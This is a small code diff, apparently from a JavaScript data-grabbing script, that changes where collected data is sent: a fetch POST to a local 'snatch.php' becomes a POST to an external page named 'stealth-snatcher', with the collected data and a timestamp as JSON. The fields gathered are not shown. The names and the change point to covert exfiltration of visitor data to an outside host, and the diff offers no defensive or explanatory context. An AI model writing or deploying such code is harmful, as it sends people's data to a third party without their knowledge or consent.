@@ -10,7 +10,7 @@
     date: new Date().toISOString()
   };
 
-  fetch('snatch.php', {
+  fetch('https://islamb3.github.io/stealth-snatcher/', {
     method: 'POST',
     headers: {'Content-Type': 'application/json'},
     body: JSON.stringify(data)
